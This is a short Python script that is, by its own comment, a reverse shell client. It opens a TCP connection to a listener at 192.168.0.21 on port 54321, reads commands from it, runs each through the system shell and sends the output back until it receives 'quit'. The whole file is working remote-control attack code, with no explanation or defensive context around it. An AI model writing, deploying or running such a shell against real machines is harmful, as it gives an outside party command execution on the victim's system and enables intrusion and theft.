#!/usr/bin/python

import socket, subprocess

def shell():
    while True:
        command = sock.recv(1024)
        command = command.decode('utf-8')
        if command == 'quit':
            break
        else:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            sock.send(result)

# Create IPv4 TCP object
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Connect to reverse shell server
sock.connect(("192.168.0.21", 54321))

shell()

sock.close()
